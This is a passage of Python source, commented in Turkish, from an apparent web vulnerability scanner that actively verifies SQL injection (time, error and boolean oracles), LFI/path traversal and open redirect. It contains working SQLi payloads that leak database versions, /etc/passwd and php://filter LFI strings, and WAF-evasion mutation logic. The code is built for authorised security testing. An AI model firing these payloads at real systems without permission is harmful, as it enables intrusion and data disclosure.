    inj_url, inj_method, inj_body, _ = candidates[0]

    def _kw(b: Optional[Dict[str, str]]) -> Dict[str, Any]:
        if b is None:
            return {}
        return {"json_data": b} if send_json else {"form_data": b}

    scaled: List[TimingSample] = []
    # Taze kontrol (enjeksiyonla aynı yüzey) — gecikme uzadıkça sunucu yavaşlamış mı ölç.
    ctl = await _timed_request(client, url, method=method, **_kw(bparams)) if use_body \
        else await _timed_get(client, url)
    if ctl is None:
        return None, 0.0
    scaled.append(TimingSample(0.0, ctl))
    for _ in range(2):
        ms = await _timed_request(client, inj_url, method=inj_method.upper(),
                                  **_kw(inj_body)) if inj_body is not None \
            else await _timed_get(client, inj_url)
        if ms is None:
            return None, 0.0
        scaled.append(TimingSample(float(larger), ms))
    ref = confirm_time_based_sqli(scaled)
    return ref.verified, ref.confidence


async def verify_time_based_sqli(
    url: str,
    client: httpx.AsyncClient,
    *,
    delay_seconds: float = 5.0,
    control_samples: int = 2,
    mutations: Optional[List[Mutation]] = None,
    method: str = "get",
    body_params: Any = None,
    body_kind: str = "form",
) -> SqliVerdict:
    """Bir URL'yi zaman-tabanlı blind SQLi için AKTİF doğrula.

    Önce kontrol (gecikmesiz) ölçümleri, sonra her parametreye SLEEP payload'u; ölçümleri
    `confirm_time_based_sqli`'ya verir. Hiç enjekte edilemezse (parametre yok) doğrulanmaz.
    `mutations` verilirse (WAF profili) her payload'un varyantları da ölçülür; kanıt
    mutasyonla gelirse SqliVerdict.mutation dolar (öğrenen döngü beslenir).

    P0-B: `method` gövde metodu (post/put/patch) ve `body_params` doluysa kontrol
    ölçümleri AYNI method+gövdeyle alınır ve SLEEP payload'u gövde parametrelerine
    enjekte edilir — API'lerin gerçek SQLi yüzeyi gövdedir (JSON/form farkı body_kind).
    """
    m = (method or "get").lower()
    bparams = body_params_dict(body_params)
    use_body = m in ("post", "put", "patch") and bool(bparams)
    send_json = body_kind == "json"

    def _send_kwargs(body: Optional[Dict[str, str]]) -> Dict[str, Any]:
        """Gövde içeriğini httpx çağrı argümanına çevir (json vs form)."""
        if body is None:
            return {}
        return {"json_data": body} if send_json else {"form_data": body}

    # 1) Kontrol ölçümleri (temiz istek — gecikme yok; method+gövde enjeksiyonla AYNI
    # olmalı, aksi halde zamanlama karşılaştırması elma-armut olur)
    samples: List[TimingSample] = []
    for _ in range(max(1, control_samples)):
        if use_body:
            ms = await _timed_request(client, url, method=m.upper(),
                                      **_send_kwargs(bparams))
        else:
            ms = await _timed_get(client, url)
        if ms is not None:
            samples.append(TimingSample(0.0, ms))

    # 2) Payload'lı ölçümler — ilk enjekte edilebilen param + ilk çalışan lehçe yeterli
    injected_any = False
    for template in _SQLI_TIME_PAYLOADS:
        base_payload = template.replace("{D}", str(int(delay_seconds)))
        for payload, mut_name in apply_mutations(base_payload, mutations or [], include_identity=not mutations):
            if use_body:
                candidates = [(url, m.upper(), body, hit_p)
                              for body, hit_p in build_injected_bodies(bparams, payload)]
            else:
                candidates = [(u, "GET", None, None) for u in build_injected_urls(url, payload)]
            for inj_url, inj_method, body, _hit_p in candidates:
                injected_any = True
                if body is not None:
                    ms = await _timed_request(client, inj_url, method=inj_method,
                                              **_send_kwargs(body))
                else:
                    ms = await _timed_get(client, inj_url)
                if ms is not None:
                    samples.append(TimingSample(delay_seconds, ms))
                # Erken teyit: bu payload gecikmeyi gösterdiyse bir tur daha ölç ve karar ver.
                interim = confirm_time_based_sqli(samples)
                if interim.verified:
                    if body is not None:
                        confirm_ms = await _timed_request(client, inj_url, method=inj_method,
                                                          **_send_kwargs(body))
                    else:
                        confirm_ms = await _timed_get(client, inj_url)
                    if confirm_ms is not None:
                        samples.append(TimingSample(delay_seconds, confirm_ms))
                    v = confirm_time_based_sqli(samples)
                    v.mutation = mut_name
                    if mut_name:
                        v.detail += f" [WAF-mutasyonu: {mut_name}]"
                    if use_body:
                        v.detail += f" [enjeksiyon: {m.upper()} gövdesi]"
                    # İKİNCİ BAĞIMSIZ ORAKL (FAQ 1.8): tek-delay zamanlaması yavaş/sıkışık
                    # sunucuda yanlış pozitif verebilir (SLEEP çalışmadan da delta görülür).
                    # Aynı enjeksiyon noktasını DAHA BÜYÜK gecikmeyle yeniden doğrula ve
                    # gecikmenin İSTENEN YÖNDE ÖLÇEKLENMESİNİ ara — gerçek bir SLEEP artıyor,
                    # aksak sunucu gürültüsü (çoğunlukla) rastgele kalır. Güven = en zayıf orakl;
                    # ölçek oraklı doğrulamazsa 'confirmed' değil 'FP şüphesi' döner.
                    scale_ok, scale_conf = await _confirm_scaled_oracle(
                        client, template=template, mut_name=mut_name, mutations=mutations,
                        delay_seconds=delay_seconds, url=url, use_body=use_body,
                        bparams=bparams, send_json=send_json, method=m,
                    )
                    if scale_ok is True:
                        v.confidence = min(v.confidence, scale_conf)
                        v.detail += (f" | ikinci orakl (ölçek) doğruladı: {int(delay_seconds*2)}sn "
                                     f"gecikme, güven=%{scale_conf*100:.0f}")
                    elif scale_ok is False:
                        v.detail += (" | ⚠️ ikinci bağımsız orakl (gecikme ölçeği) doğrulayamadı "
                                     f"— aksak sunucu veya FP şüphesi (verifier güveni düştü)")
                        # Güven = en zayıf orakl: ölçek oraklı reddetti, confirmed kalmaz.
                        v.confidence = min(v.confidence, scale_conf)
                    # scale_ok None → ölçüm alınamadı (ağ hatası) → birinci orakl kararı korunur.
                    return v

    if not injected_any:
        where = "gövde" if use_body else "sorgu"
        return SqliVerdict(False, 0.0, "time-based-blind-sqli",
                           f"Enjekte edilebilir {where} parametresi yok — doğrulama atlandı.",
                           skipped=True)
    return confirm_time_based_sqli(samples)


# ============================================================
# Madde 3 (T3) — HATA-İMZALI ve BOOLEAN-SQLI oraklları
# ============================================================
# Zaman-tabanlı orakl tek başına pahalı ve kördü: (a) payload başına ~D sn → merge
# tavanı 8'de kalmak ZORUNDA, corpus derinliği işe yaramıyordu; (b) WAF gecikmeyi
# kırparsa hiç kanıt yok. Error-based: tek istek, DB hata mesajı = deterministik kanıt
# (XPATH/duplicate-entry hataları VERİ TAŞIR — versiyon/DB adı ifşası). Boolean-based:
# AND 1=1 / AND 1=2 çift istek diferansiyeli — gecikmesiz blind kanıt. Üç orakl
# `verify_sqli` zincirinde ucuzdan pahalıya: error → boolean → time.
# FP kontrolü LFI deseniyle birebir: imza/enjeksiyon yalnız payload yanıtında olmalı,
# baseline'da varsa elenir (statik hata sayfası / sabit içerik kanıt sayılmaz).

# (imza-adı, güven, regex) — sıra önemli: veri taşıyan imzalar önce (daha yüksek güven).
# Hata metinleri DB sürücülerinin SABIT çıktısıdır (kaynak: sqlmap error-mapping + DB
# dokümantasyonu) — hedef yerelleştirmesinden bağımsız, İngilizce kalırlar.
_SQLI_ERROR_SIGNATURES = [
    ("mysql-xpath-leak", 0.95, re.compile(r"XPATH syntax error:\s*['\"]", re.I)),
    ("mysql-duplicate-leak", 0.95, re.compile(r"Duplicate entry '[^']*' for key", re.I)),
    ("mssql-conversion-leak", 0.92, re.compile(r"Conversion failed when converting (the n?varchar value '[^']*' to data type|int value '[^']*' to n?varchar)", re.I)),
    ("mysql-unknown-column", 0.90, re.compile(r"Unknown column '[^']+' in", re.I)),
    ("mysql-syntax", 0.85, re.compile(r"you have an error in your sql syntax|right syntax to use near|supplied argument is not a valid (?:my)?[sS][qQ][lL]|MySQLSyntaxErrorException|valid MySQL result", re.I)),
    ("postgres-syntax", 0.85, re.compile(r"pg_query\(\)|PG::\w*Error|psycopg2\.\w*Error|PostgreSQL query failed|syntax error at or near \B\W|unterminated quoted string at or near", re.I)),
    ("mssql-native", 0.88, re.compile(r"\[SQL Server\]|Microsoft SQL Native Client|OLE DB Provider for SQL Server|Msg \d{3,5}, Level \d+, State \d+|com\.microsoft\.sqlserver\.jdbc", re.I)),
    ("mssql-quotation", 0.85, re.compile(r"Unclosed quotation mark after the character string|Unclosed quotation mark", re.I)),
    ("oracle-ora", 0.90, re.compile(r"ORA-\d{4,5}|PLS-\d{4,5}|quoted string not properly terminated", re.I)),
    ("sqlite", 0.85, re.compile(r"SQLite3::(?:query|prepare)|sqlite3\.OperationalError|SQLiteException|SQLite/JDBCDriver|unrecognized token: \B\W", re.I)),
    ("generic-sqlstate", 0.80, re.compile(r"SQLSTATE\[\d{5}\]|java\.sql\.SQLSyntaxErrorException", re.I)),
]


def detect_sqli_error_signature(body: str) -> Optional[Tuple[str, float]]:
    """Yanıt gövdesinde DB hata imzası ara (SAF). İlk eşleşen (imza_adı, güven) döner;
    yoksa None. Baseline karşılaştırması çağıranın işi (FP eksisi — LFI deseni)."""
    if not body:
        return None
    for name, conf, rx in _SQLI_ERROR_SIGNATURES:
        if rx.search(body):
            return name, conf
    return None


def confirm_boolean_sqli(true_bodies: List[Optional[str]],
                         false_bodies: List[Optional[str]]) -> Tuple[bool, str]:
    """Boolean-based blind SQLi diferansiyeli (SAF): TRUE koşullu ve FALSE koşullu
    enjeksiyonların yanıt GÖVDELERİ kıyaslanır. Kanıt: true yanıtları kendi içinde
    KARARLI (t1==t2), false yanıtları kendi içinde kararlı (f1==f2), ve true≠false.
    Dinamik içerik (timestamp/token) kararlılığı bozar → doğrulanmaz (FP üretmez,
    FN kabul — tekrarlı taramada cache ısınınca yakalanır)."""
    def norm(b: Optional[str]) -> Optional[str]:
        if b is None:
            return None
        return re.sub(r"\s+", " ", b[:100_000])
    t = [norm(b) for b in true_bodies]
    f = [norm(b) for b in false_bodies]
    if any(x is None or len(x) < 16 for x in t) or any(x is None or len(x) < 16 for x in f):
        return False, "yetersiz/boş ölçüm"
    if t[0] != t[-1] or f[0] != f[-1]:
        return False, "yanıtlar kararlı değil (dinamik içerik) — diferansiyel güvenilir değil"
    if t[0] == f[0]:
        return False, "TRUE/FALSE enjeksiyonları AYNI yanıtı üretti — parametre sorguya girmiyor"
    return True, (f"TRUE/FALSE SQL koşulları yanıt gövdesinde tutarlı FARK üretti "
                  f"(uzunluk farkı {abs(len(t[0]) - len(f[0]))}+) — boolean-based blind SQLi")


# Hata-üretici inline çekirdek (lehçe başına en az bir; corpus SONRA eklenir).
# Hepsi SELECT-bağlamı; yıkıcı regex adaptive_payloads._payload_ok'te tek kaynak.
_SQLI_ERROR_PAYLOADS_INLINE = [
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- -",   # MySQL XPATH → versiyon sızar
    "' AND UPDATEXML(1,CONCAT(0x7e,VERSION(),0x7e),1)-- -",    # MySQL XPATH alternatifi
    "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM "
    "INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- -",            # MySQL duplicate → sızar
    "' AND 1=CAST(@@version AS INT)-- -",                      # MSSQL conversion → sürüm sızar
    "' AND 1=CONVERT(INT,@@version)-- -",                      # MSSQL conversion alternatifi
    "'",   # evrensel tırnak-kırıcı — her DB sentaks hatası üretir (generic-sqlstate)
]
_SQLI_ERROR_PAYLOADS = _merge_corpus("sqli_error", _SQLI_ERROR_PAYLOADS_INLINE)

# Negatif taramada istek patlamasını sınırla (payload × param çarpımı). error ucuz ama
# sınırsız değil; env ile operatör ayarı (SQLI_ERROR_MAX_REQ).
_SQLI_ERROR_MAX_REQ_DEFAULT = 60

# Boolean çiftleri: append bağlamında AND — sayısal/tırnaklı/dengeli-tırnaklı üç bağlam.
_SQLI_BOOL_PAIRS = [
    ("' AND 1=1-- -", "' AND 1=2-- -"),
    (" AND 1=1", " AND 1=2"),
    ("' AND '1'='1", "' AND '1'='2"),
]
_SQLI_BOOL_MAX_REQ_DEFAULT = 36


def _flag_enabled(name: str, default: str = "1") -> bool:
    return os.getenv(name, default).strip().lower() in ("1", "true", "on")


async def _fetch_body_any(client: httpx.AsyncClient, url: str, *, method: str = "GET",
                          form_data: Optional[Dict[str, str]] = None,
                          json_data: Optional[Dict[str, Any]] = None,
                          max_bytes: int = 128_000) -> Optional[str]:
    """Hata-oracli gövde çekicisi: 4xx/5xx GÖVDELERİNİ DE döndürür (DB hata mesajları
    sıklıkla 500 sayfasında yaşar — _fetch_body'nin 5xx→None kuralı burada FP değil FN
    üretirdi). FP riski imza spesifikliğiyle kontrol altında; ağ hatası → None."""
    try:
        if json_data is not None:
            r = await client.request(method, url, json=json_data, timeout=15.0)
        elif form_data is not None:
            r = await client.request(method, url, data=form_data, timeout=15.0)
        else:
            r = await client.request(method, url, timeout=15.0)
        return (r.text or "")[:max_bytes]
    except Exception:
        return None


async def verify_error_based_sqli(
    url: str, client: httpx.AsyncClient, *,
    mutations: Optional[List[Mutation]] = None,
    method: str = "get", body_params: Any = None, body_kind: str = "form",
) -> SqliVerdict:
    """Error-based SQLi AKTİF doğrulama: her payload her parametreye EKLENİR (append —
    SQL bağlamı), yanıtta DB hata imzası ARANIR; imza baseline'da varsa elenir.
    İlk imzada erken durur (tek kanıt yeter doktrini). Ucuz: payload başına 1 istek."""
    m = (method or "get").lower()
    bparams = body_params_dict(body_params)
    use_body = m in ("post", "put", "patch") and bool(bparams)
    send_json = body_kind == "json"

    async def _send(inj_url: Optional[str], body: Optional[Dict[str, str]]) -> Optional[str]:
        if body is not None:
            if send_json:
                return await _fetch_body_any(client, url, method=m.upper(), json_data=body)
            return await _fetch_body_any(client, url, method=m.upper(), form_data=body)
        return await _fetch_body_any(client, inj_url or url)

    baseline = await _send(None, bparams if use_body else None)
    baseline_sig = detect_sqli_error_signature(baseline or "")

    max_req = int(os.getenv("SQLI_ERROR_MAX_REQ", str(_SQLI_ERROR_MAX_REQ_DEFAULT)) or 60)
    sent = 0
    injected_any = False
    for base_payload in _SQLI_ERROR_PAYLOADS:
        for payload, mut_name in apply_mutations(base_payload, mutations or [],
                                                 include_identity=not mutations):
            if use_body:
                candidates = [(None, b, p) for b, p in build_injected_bodies(bparams, payload)]
            else:
                candidates = [(u, None, None) for u in build_injected_urls(url, payload)]
            for inj_url, body, hit_p in candidates:
                if sent >= max_req:
                    break
                injected_any = True
                sent += 1
                resp = await _send(inj_url, body)
                if resp is None:
                    continue
                sig = detect_sqli_error_signature(resp)
                if sig and (not baseline_sig or sig[0] != baseline_sig[0]):
                    name, conf = sig
                    where = f"gövde '{hit_p}'" if (use_body and hit_p) else "sorgu"
                    mut_note = f" [WAF-mutasyonu: {mut_name}]" if mut_name else ""
                    leak_note = " — hata mesajı VERİ TAŞIYOR (sürüm/nesne adı ifşası)" \
                        if "leak" in name or "unknown" in name else ""
                    return SqliVerdict(
                        True, conf, "error-based-sqli",
                        f"'{payload}' enjeksiyonuna yanıtta '{name}' DB hata imzası "
                        f"(baseline'da yok, {where} bağlamı{leak_note}). "
                        f"Error-based SQL injection TEYİT edildi.{mut_note}",
                        mutation=mut_name)
            if sent >= max_req:
                break
        if sent >= max_req:
            break
    if not injected_any:
        where = "gövde" if use_body else "sorgu"
        return SqliVerdict(False, 0.0, "error-based-sqli",
                           f"Enjekte edilebilir {where} parametresi yok.", skipped=True)
    return SqliVerdict(False, 0.0, "error-based-sqli",
                       "Hiçbir hata-üretici payload DB hata imzası üretmedi — kapalı "
                       "hata sayfaları veya temiz girdi (boolean/time oraklları devrede).")


async def verify_boolean_based_sqli(
    url: str, client: httpx.AsyncClient, *,
    mutations: Optional[List[Mutation]] = None,
    method: str = "get", body_params: Any = None, body_kind: str = "form",
) -> SqliVerdict:
    """Boolean-based blind SQLi: TRUE/FALSE SQL koşulu çiftleri her parametreye eklenir;
    her kol ikişer kez çekilir (kararlılık ölçümleri). Diferansiyel SAF karar
    `confirm_boolean_sqli`'da. Hata sayfaları kasıtlı 4xx/5xx-görmez (gövde karşılaştırılır)."""
    m = (method or "get").lower()
    bparams = body_params_dict(body_params)
    use_body = m in ("post", "put", "patch") and bool(bparams)
    send_json = body_kind == "json"
    max_req = int(os.getenv("SQLI_BOOL_MAX_REQ", str(_SQLI_BOOL_MAX_REQ_DEFAULT)) or 36)

    async def _send(inj_url: Optional[str], body: Optional[Dict[str, str]]) -> Optional[str]:
        if body is not None:
            if send_json:
                return await _fetch_body_any(client, url, method=m.upper(), json_data=body)
            return await _fetch_body_any(client, url, method=m.upper(), form_data=body)
        return await _fetch_body_any(client, inj_url or url)

    sent = 0
    injected_any = False
    for t_pl, f_pl in _SQLI_BOOL_PAIRS:
        for (t_url, t_body, _hp), (f_url, f_body, _hp2) in zip(
            [(u, None, None) for u in build_injected_urls(url, t_pl)] if not use_body
                else [(None, b, p) for b, p in build_injected_bodies(bparams, t_pl)],
            [(u, None, None) for u in build_injected_urls(url, f_pl)] if not use_body
                else [(None, b, p) for b, p in build_injected_bodies(bparams, f_pl)],
        ):
            if sent + 4 > max_req:
                break
            injected_any = True
            t_bodies = [await _send(t_url, t_body), await _send(t_url, t_body)]
            f_bodies = [await _send(f_url, f_body), await _send(f_url, f_body)]
            sent += 4
            ok, detail = confirm_boolean_sqli(t_bodies, f_bodies)
            if ok:
                mut_note = f" [çift: {t_pl} / {f_pl}]"
                where = " [enjeksiyon: gövde]" if use_body else ""
                return SqliVerdict(True, 0.75, "boolean-based-blind-sqli",
                                   detail + mut_note + where)
        if sent + 4 > max_req:
            break
    if not injected_any:
        where = "gövde" if use_body else "sorgu"
        return SqliVerdict(False, 0.0, "boolean-based-blind-sqli",
                           f"Enjekte edilebilir {where} parametresi yok.", skipped=True)
    return SqliVerdict(False, 0.0, "boolean-based-blind-sqli",
                       "TRUE/FALSE çiftleri tutarlı gövde farkı üretmedi — parametre "
                       "sorguya girmiyor veya çıktı SQL koşulundan bağımsız.")


async def verify_sqli(
    url: str, client: httpx.AsyncClient, *,
    delay_seconds: float = 5.0,
    control_samples: int = 2,
    mutations: Optional[List[Mutation]] = None,
    method: str = "get", body_params: Any = None, body_kind: str = "form",
) -> SqliVerdict:
    """SQLi zincir oraklı — ucuzdan pahalıya: error-based (1 istek/payload) →
    boolean-based (4 istek/çift) → time-based (D sn/ölçüm). İlk teyitte durur;
    hiçbiri doğrulamazsa ZAMAN-oraklının kararı döner (geriye-uyumlu detay).
    Env kapıları: SQLI_ERROR_ORACLE / SQLI_BOOL_ORACLE (varsayılan AÇIK — pasif-ish,
    yalnız SELECT-bağlamı payload'lar)."""
    kw = dict(mutations=mutations, method=method, body_params=body_params,
              body_kind=body_kind)
    if _flag_enabled("SQLI_ERROR_ORACLE"):
        try:
            v = await verify_error_based_sqli(url, client, **kw)
            if v.verified:
                return v
        except Exception:  # orakl hatası zinciri düşürmez — sonraki orakl sürer
            pass
    if _flag_enabled("SQLI_BOOL_ORACLE"):
        try:
            v = await verify_boolean_based_sqli(url, client, **kw)
            if v.verified:
                return v
        except Exception:
            pass
    return await verify_time_based_sqli(url, client, delay_seconds=delay_seconds,
                                        control_samples=control_samples, **kw)


# ============================================================
# Grup A — LFI / Path Traversal (CWE-98/CWE-22)
# ============================================================
# Fikir: dosya/yol parametresine BİLİNEN, zararsız sistem dosyası enjekte et; yanıtta imza
# görünürse kanıtlanmış olur. Tahribatsız: yalnız OKUMA (passwd/win.ini/kaynak kod) — dosya
# yazma/komut DENENMEZ. False-positive elemesi: imza baseline'da da varsa (statik sayfa)
# doğrulanmaz; yalnız payload yanıtına ÖZGÜ olmalı.

_PASSWD_RE = re.compile(r"root:.{0,80}:0:0:")
_WIN_INI_MARKERS = ("[extensions]", "[fonts]")
# Madde 3 — yeni kanarya imzaları (SAF): /proc/self/environ en az iki klasik env
# değişkeni ister (tek "PATH=" statik dokümanda da geçebilir → çift şart FP kırpar);
# access log Apache/nginx combined format'ının sabit kalıbıdır; boot.ini bölüm başlığı.
# ÇİFT ARAMA (tek regex lookahead DEĞİL — lookahead'lar aynı pozisyondan başlar,
# "her yerde ara" anlamına gelmez; ilk tasarımdaki hata buydu): PATH + (HOME|PWD|SHLVL)
# AYNI gövdede ve sözdizimsel sınırda (satırbaşı/boşluk/NUL/=) geçmeli.
_PROC_ENVIRON_RES = (
    re.compile(r"(?:^|[\s\x00=])PATH="),
    re.compile(r"(?:^|[\s\x00=])(?:HOME|PWD|SHLVL)="),
)
_ACCESS_LOG_RE = re.compile(r"\d{1,3}(?:\.\d{1,3}){3} \S+ \S+ \[\d{2}/[A-Za-z]{3}/\d{4}")
_BOOT_INI_MARKERS = ("[boot loader]", "multi(0)")
# php://filter base64 çıktısından çözülen kaynak kod imzası.
_B64_BLOB_RE = re.compile(r"[A-Za-z0-9+/=]{80,}")


def detect_lfi_signature(body: str) -> Optional[str]:
    """Yanıt gövdesinde LFI kanıtı ara. Varsa imza adını döndür (SAF — I/O yok).

    İmzalar: /etc/passwd satırı (root:.*:0:0:), win.ini/boot.ini bölüm başlıkları,
    /proc/self/environ env dökümü, web sunucusu access log'u (Madde 3 genişletme),
    php://filter ile sızmış base64'ün içinde çözülen `<?php` (kaynak kod ifşası —
    en güçlü kanıt)."""
    if not body:
        return None
    if _PASSWD_RE.search(body):
        return "etc_passwd"
    if any(m in body for m in _WIN_INI_MARKERS):
        return "win_ini"
    if any(m in body for m in _BOOT_INI_MARKERS):
        return "boot_ini"
    if all(rx.search(body) for rx in _PROC_ENVIRON_RES):
        return "proc_environ"
    if _ACCESS_LOG_RE.search(body):
        return "access_log"
    # php://filter/convert.base64-encode yanıtı: gövdede uzun base64 bloğu olur; çözüp
    # kaynak kod imzası ara. Yanlış-pozitif riski düşük: rastgele sayfa içeriğinde çözülen
    # base64'ün `<?php` üretmesi pratikte imkânsız.
    for m in _B64_BLOB_RE.finditer(body):
        blob = m.group(0)
        # base64 uzunluğu 4'ün katı olmalı; değilse padding'i kırparak dene.
        blob = blob[: len(blob) - (len(blob) % 4)] if len(blob) % 4 else blob
        if len(blob) < 80:
            continue
        try:
            decoded = base64.b64decode(blob, validate=True)
        except (binascii.Error, ValueError):
            continue
        if b"<?php" in decoded:
            return "php_filter_source"
    return None


# Değer TAMAMEN değiştirilir (path traversal payload'u mevcut değere eklenemez — değerin
# kendisi dosya yolu olmalı). LLM'in hedeflediği param öncelikli; yoksa tüm parametreler.
# T4-A: inline çekirdek korunur (fallback), offline-süzülmüş corpus lehçe/şekil ekler.
_LFI_PAYLOADS_INLINE = [
    "../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "/etc/passwd%00",
    "..\\..\\..\\windows\\win.ini",
    "php://filter/convert.base64-encode/resource=index.php",
]
_LFI_PAYLOADS = _merge_corpus("lfi", _LFI_PAYLOADS_INLINE)


def _replace_param_urls(url: str, value: str, *, only_param: Optional[str] = None,
                        max_params: int = 5) -> List[str]:
    """Sorgu parametrelerinin DEĞERİNİ `value` ile değiştirerek aday URL'ler üret.
    only_param verilirse yalnız o parametre (LLM'in hedeflediği); yoksa hepsi —
    ama max_params ile tavanlı (dokunuş bütçesi: payload × parametre istek patlamasın;
    POC_VERIFY_MAX hipotezi sayar, isteği saymaz)."""
    parts = urlsplit(url)
    params = parse_qsl(parts.query, keep_blank_values=True)
    if not params:
        return []
    out: List[str] = []
    mutated_count = 0
    for i, (k, _v) in enumerate(params):
        if only_param and k != only_param:
            continue
        if not only_param and mutated_count >= max_params:
            break  # dokunuş tavanı: URL'nin tamamı korunur, sadece mutasyon sayısı sınırlı
        mutated = list(params)
        mutated[i] = (k, value)
        mutated_count += 1
        out.append(urlunsplit((parts.scheme, parts.netloc, parts.path,
                               urlencode(mutated), parts.fragment)))
    return out


async def verify_lfi(url: str, param: Optional[str], client: httpx.AsyncClient,
                     *, mutations: Optional[List[Mutation]] = None,
                     method: str = "get", body_params: Any = None,
                     body_kind: str = "form") -> Verdict:
    """LFI/path-traversal AKTİF doğrulaması: her payload için imza yalnız payload yanıtında
    çıkarsa (baseline'da YOKSA) verified. Statik sayfa yanlış-pozitifi baseline ile elenir.
    `mutations` verilirse (WAF profili) her payload'un varyantları da denenir — kanıt bir
    varyantla gelirse Verdict.mutation'a adı yazılır (öğrenen döngü beslenir).

    P0-B: gövde metodu + body_params verilirse baseline AYNI method+gövdeyle alınır ve
    payload gövde parametresinin DEĞERİNİ ezerek enjekte edilir (dosya-yolu bağlamı)."""
    m = (method or "get").lower()
    bparams = body_params_dict(body_params)
    use_body = m in ("post", "put", "patch") and bool(bparams)
    send_json = body_kind == "json"

    if use_body:
        only = param if param and param in bparams else None

        def _send(body: Dict[str, str]) -> Any:
            return _fetch_body_request(client, url, method=m.upper(),
                                       json_data=body if send_json else None,
                                       form_data=None if send_json else body)

        baseline = await _send(bparams)
        baseline_sig = detect_lfi_signature(baseline or "")

        tried = False
        for base_payload in _LFI_PAYLOADS:
            for payload, mut_name in apply_mutations(base_payload, mutations or [], include_identity=not mutations):
                for body, hit_param in build_injected_bodies(bparams, payload,
                                                             replace=True, only_param=only):
                    tried = True
                    resp_body = await _send(body)
                    if resp_body is None:
                        continue
                    sig = detect_lfi_signature(resp_body)
                    if sig and sig != baseline_sig:
                        mut_note = f" [WAF-mutasyonu: {mut_name}]" if mut_name else ""
                        return Verdict(
                            True, 0.9, "lfi-signature",
                            f"{m.upper()} gövdesi '{hit_param}' parametresine '{payload}' payload'u "
                            f"enjekte edildi; yanıtta '{sig}' imzası görüldü (baseline'da yok) "
                            f"— dosya okuma kanıtlandı. LFI/path-traversal TEYİT edildi.{mut_note}",
                            mutation=mut_name)
        if not tried:
            return Verdict(False, 0.0, "lfi-signature", "Gövde enjeksiyon noktası kurulamadı.",
                           skipped=True)
        return Verdict(False, 0.0, "lfi-signature",
                       "Hiçbir gövde payload'unda dosya imzası (passwd/win.ini/kaynak) yansımadı — "
                       "muhtemel false-positive, doğrulanmadı.")

    parts = urlsplit(url)
    params = parse_qsl(parts.query, keep_blank_values=True)
    if not params:
        return Verdict(False, 0.0, "lfi-signature",
                       "Enjekte edilebilir sorgu parametresi yok — doğrulama atlandı.",
                       skipped=True)
    only = param if param and any(k == param for k, _ in params) else None

    baseline = await _fetch_body(client, url)
    baseline_sig = detect_lfi_signature(baseline or "")

    tried = False
    for base_payload in _LFI_PAYLOADS:
        for payload, mut_name in apply_mutations(base_payload, mutations or [], include_identity=not mutations):
            for inj_url in _replace_param_urls(url, payload, only_param=only):
                tried = True
                body = await _fetch_body(client, inj_url)
                if body is None:
                    continue
                sig = detect_lfi_signature(body)
                if sig and sig != baseline_sig:
                    # Kanıt detayında içerik SIZDIRMA — yalnız imza adı + hangi parametre.
                    hit_param = next((k for k, v in parse_qsl(urlsplit(inj_url).query)
                                      if v == payload), only or "?")
                    mut_note = f" [WAF-mutasyonu: {mut_name}]" if mut_name else ""
                    return Verdict(
                        True, 0.9, "lfi-signature",
                        f"'{payload}' payload'una yanıtta '{sig}' imzası görüldü (baseline'da yok) "
                        f"— dosya okuma kanıtlandı. LFI/path-traversal TEYİT edildi "
                        f"(param={hit_param}).{mut_note}",
                        mutation=mut_name)
    if not tried:
        return Verdict(False, 0.0, "lfi-signature", "Enjeksiyon noktası kurulamadı.", skipped=True)
    return Verdict(False, 0.0, "lfi-signature",
                   "Hiçbir payload'da dosya imzası (passwd/win.ini/kaynak) yansımadı — "
                   "muhtemel false-positive, doğrulanmadı.")


# ============================================================
# Grup A — Open Redirect (CWE-601)
# ============================================================
# Fikir: yönlendirme parametresine saldırgan-kontrollü SENTINEL host koy; sunucu 30x +
# Location ile oraya yönlendiriyorsa kanıtlanmış olur. Sentinel `.invalid` TLD'sinde —
# gerçekte çözülmez, takip edilmez (follow_redirects=False), hedefe zarar vermez.

_SENTINEL_HOST = "kadim-oob.invalid"


def is_open_redirect_location(location: str, sentinel_host: str = _SENTINEL_HOST) -> bool:
    """Location başlığı sentinel host'a mı çözülüyor? (SAF — I/O yok)

    Kabul: netloc tam sentinel veya alt alanı (a.kadim-oob.invalid). Hedefin KENDİ domain'i
    veya başka harici host kabul edilmez — açık-yönlendirme tanımı: saldırgan-kontrollü
    harici hedef; bizim sentinel'imiz o rolü oynar."""
    if not location or not sentinel_host:
        return False
    loc = location.strip()
    # Tarayıcılar '/\', '\/', '\\' önekini de protokolsüz-yetkili (//host) gibi işler —
    # sunucu Location'ı bu biçimde dönerse de yakala (yoksa false-negative).
    lead = len(loc) - len(loc.lstrip("/\\"))
    if lead >= 2:
        # Kalan backslash'leri de '/'ye çevir: urlsplit '\' işaretini sınırlayıcı saymaz,
        # tarayıcı sayar — aksi halde netloc kirlenebilir (\\host\abc → host\abc).
        loc = "http://" + loc.lstrip("/\\").replace("\\", "/")
    elif re.match(r"^[a-zA-Z][a-zA-Z0-9+.-]*:[^/]", loc):
        # "https:kadim-oob.invalid/x" → urlsplit netloc'u boş verir; '//' ekleyerek düzelt.
        scheme, _, rest = loc.partition(":")
        loc = f"{scheme}://{rest.lstrip('/')}"
    netloc = urlsplit(loc).netloc.lower().split("@")[-1].split(":")[0]
    return netloc == sentinel_host or netloc.endswith("." + sentinel_host)


def _redirect_variants(token: str) -> List[str]:
    h = _SENTINEL_HOST
    return [
        f"https://{h}/{token}",
        f"//{h}/{token}",
        f"https:{h}/{token}",
        f"/\\{h}/{token}",
    ]


async def verify_open_redirect(url: str, param: Optional[str],
                               client: httpx.AsyncClient,
                               *, mutations: Optional[List[Mutation]] = None,
                               method: str = "get", body_params: Any = None,
                               body_kind: str = "form") -> Verdict:
    """Open-redirect AKTİF doğrulaması: 30x + Location sentinel host'a çözülüyorsa verified.
    İstek başına follow_redirects=False — sentinel'e ASLA gerçek istek atılmaz.
    `mutations` verilirse sentinel varyantları mutasyonlu da denenir (WAF parse farkı).

    P0-B: gövde metodu + body_params verilirse yönlendirme değeri gövde parametresine
    enjekte edilir (login/logout API'lerinde 'next'/'redirect' gövdede taşınır)."""
    import secrets as _sec
    m = (method or "get").lower()
    bparams = body_params_dict(body_params)
    use_body = m in ("post", "put", "patch") and bool(bparams)
    send_json = body_kind == "json"

    if use_body:
